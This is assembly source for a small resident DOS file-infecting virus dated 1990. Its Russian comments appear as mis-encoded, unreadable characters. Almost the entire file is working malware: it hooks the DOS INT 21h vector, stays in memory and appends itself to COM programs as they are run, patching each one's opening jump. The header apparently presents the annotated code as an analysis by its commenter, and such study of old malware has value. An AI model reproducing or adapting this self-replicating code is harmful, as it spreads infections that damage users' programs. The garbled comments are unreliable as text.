﻿

; â®â ¢¨àãá - á ¬ë© ª®à®âª¨© ¨§ ¨§¢¥áâ­ëå ¬­¥,
;  ¯®íâ®¬ã ¥¬ã ¬®¦­® ¯à®áâ¨âì ­¥ª®â®àë¥ ­¥¤®¤¥«ª¨.
; ‡¤¥áì ¯à¨¢®¤ïâáï ¯®¤à®¡­ë¥ ª®¬¬¥­â à¨¨ ª ­¥¬ã,
;  ­® íâ® ­¥ ¤®«¦­® á«ã¦¨âì ª®¬ã-«¨¡® ¯®¢®¤®¬
;  ­ ¯¨á âì á¢®©, ¡®«¥¥ ¯®¤«ë© ¨ £ ¤ª¨©.
;                                  ‹®§¨­áª¨© „. .
.286
.model tiny
.radix 16
.code
	org	100
a	db	0E9			; ¥à¥å®¤ ­ 
	dw	d-b			;   ­ ç «® ¢¨àãá 
b:	mov	ah,9			; ®çâ¨ ¢áï
	int	21			;   ¨áå®¤­ ï
	ret				;   ¯à®£à ¬¬ 
c	db	'Virus Loader (C) 1990 by GlukSoft.',0DH,0A,24
d:	pusha				; ‡ ¯®¬¨­ ­¨¥ ¢ áâ¥ª¥ ¢á¥å Ž
	mov	di,si			; “áâ ­®¢ª  ¢ ¯à¨¥¬­¨ª ­ ç «® ¯à®£à ¬¬ë
	call	e			; Ž¯à¥¤¥«¥­¨¥
e:	pop	si			;   ¬¥áâ®¯®«®¦¥­¨ï ¢¨àãá 
	db	83,0C6,g-e		; ‚ëç¨á«¥­¨¥ á®åà ­¥­­ëå ¡ ©â®¢
	movsb				; ‡ ¯¨áì ¨å ¢ ­ ç «®
	movsw				;   ¯à®£à ¬¬ë (¢®ááâ ­®¢«¥­¨¥)
	mov	ax,24			; “áâ ­®¢ª  á¥£¬¥­â , £¤¥
	mov	es,ax			;   à á¯®«®£ ¥âáï ¢¨àãá
	xor	di,di			; “áâ ­®¢ª  á¬¥é¥­¨ï
	db	83,0EE,g-d+3		; ‚ëç¨á«¥­¨¥ ­ ç «  ¢¨àãá 
	cmp	byte ptr es:[di],60	; à®¢¥àª  ­  ­ «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨
	mov	cl,k-d			; “áâ ­®¢ª  ¤«¨­ë ¢¨àãá 
	rep	movsb			; ‡ ¯¨áì ¢¨àãá  ¢ ¯ ¬ïâì
	jz	f			; …á«¨ ¢¨àãá ¥áâì, â® ¯à®¯ãáâ¨âì ¤® f:
	mov	ds,cx			; “áâ ­®¢ª  á¥£¬¥­â  â ¡«¨æë ¯à¥àë¢ ­¨©
	mov	si,84			; “áâ ­®¢ª   ¤à¥á  INT 21H
	movsw				; ‡ ¯®¬¨­ ­¨¥
	movsw				;   áâ à®£® ¢¥ªâ®à 
	mov	word ptr [si-4],h-d	; “áâ ­®¢ª 
	mov	[si-2],ax		;   ­®¢®£® ¢¥ªâ®à 
	push	cs			; ‚®ááâ ­®¢«¥­¨¥
	pop	ds			;   ¨§¬¥­¥­­ëå
f:	push	cs			;   á¥£¬¥­â­ëå
	pop	es			;   à¥£¨áâà®¢
	popa				; ‚®ááâ ­®¢«¥­¨¥ ¢á¥å Ž
	jmp	si			; ‚®§¢à â ­  ­ ç «® ¯à®£à ¬¬ë
	db	0E9			;  ç «® ª®¬ ­¤ë ¯¥à¥å®¤ 
g:	mov	dx,offset c		; ’à¨ ¡ ©â  ¨§ ­ ç «  ¯à®£à ¬¬ë
h:	pusha				; ‡ ¯®¬­¨âì ¢ áâ¥ª¥ ¢á¥ Ž
	push	ds			; ‡ ¯®¬­¨âì à¥£¨áâà á¥£¬¥­â  ¤ ­­ëå
	xor	ah,4BH			; à®¢¥à¨âì ­  äã­ªæ¨î "EXEC"
	jnz	j			; à®¤®«¦ âì â®«ìª® ¯à¨ ­¥©
	mov	ax,3D02H		; Žâªàëâì § ¯ãáª ¥¬ë©
	int	0B4			;   ä ©« ¤«ï § ¯¨á¨
	jc	j			; …á«¨ ®è¨¡ª , â® ­¥ ¯ëâ âìáï
	mov	bx,ax			; ‡ ¯¨áì HANDLE ªã¤  ­ ¤®
	push	cs			; “áâ ­®¢¨âì à¥£¨áâà á¥£¬¥­â 
	pop	ds			;   ¤ ­­ëå ­  ª®¤
	mov	ah,3F			; ‘ç¨â âì ¨§ § ¯ãáª ¥¬®£® ä ©« 
	mov	cx,3			;   ¯¥à¢ë¥ âà¨ ¡ ©â 
	mov	dx,g-d			;   ªã¤  ­ ¤®
	mov	si,dx			; ‡ ¯®¬­¨âì íâ®â  ¤à¥á
	int	0B4			; ‚ë¯®«­¨âì áç¨âë¢ ­¨¥
	cmp	byte ptr [si],'M'	; …á«¨ § ¯ãáª îâ ä ©« "EXE",
	jz	i			;   â® ­¥ § à ¦ âì
	mov	ax,4202			; “áâ ­®¢ª  £®«®¢ª¨
	xor	cx,cx			;   ­  ª®­¥æ
	xor	dx,dx			;   ä ©« 
	int	0B4			; ‚ë¯®«­¨âì ãáâ ­®¢ªã
	sub	al,3			; ‚ëç¥áâì ¨§ ¤«¨­ë 3 (à ¡®â ¥â ¢ 99%)
	mov	bp,ax			; ‡ ¯®¬­¨âì íâ®
	mov	cl,k-d			; ‚ëç¨á«¨âì  ¤à¥á
	sub	ax,cx			;   ¯à¥¤¯®« £ ¥¬®£® ¢¨àãá 
	cmp	ax,[si+1]		; …á«¨ ¯¥à¥å®¤ âã¤  (¯®çâ¨),
	jz	i			;   â® ­¥ § à ¦ âì
	mov	ah,40			; ®¤æ¥¯¨âì ¢¨àãá
	int	0B4			;   ª ä ©«ã
	mov	ax,4200			; “áâ ­®¢¨âì £®«®¢ªã
	xor	cx,cx			;   ­  ­ ç «®
	int	0B4			;   ä ©« 
	mov	ah,40			; ‡ ¯¨á âì
	lea	dx,[si-1]		;   ¯¥à¥å®¤
	mov	cl,3			;   ­  ¢¨àãá
	mov	[si],bp			;   ¢ ­ ç «®
	int	0B4			;   ä ©« 
i:	mov	ah,3E			; ‡ ªàëâì
	int	0B4			;   ä ©«
j:	pop	ds			; ‚®ááâ ­®¢¨âì à¥£¨áâà á¥£¬¥­â  ¤ ­­ëå
	popa				; ‚®ááâ ­®¢¨âì ¢á¥ Ž
	db	0EA			; ‚ë¯®«­¨âì áâ à®¥ ¯à¥àë¢ ­¨¥
k:
end	a

